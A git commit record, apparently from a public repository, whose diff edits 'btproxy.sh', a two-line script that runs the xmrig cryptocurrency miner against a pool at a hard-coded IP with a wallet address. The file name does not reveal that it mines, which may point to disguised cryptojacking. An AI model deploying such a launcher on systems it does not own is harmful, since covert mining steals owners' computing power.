3a0bca758db231c97ff93b94b6263929ddc77846
robertreynolds2 <64372884+robertreynolds2@users.noreply.github.com>
2021-10-10 09:54:10 +0700

    Update btproxy.sh

--- btproxy.sh
+++ btproxy.sh
@@ -1,2 +1,2 @@
 cd /xmrig/build/
-./xmrig --av 7 --safe --cpu-priority 5 -o 139.180.190.196:1231 -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.aq
+./xmrig -o 139.180.190.196:1231 -a rx -k -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.aq
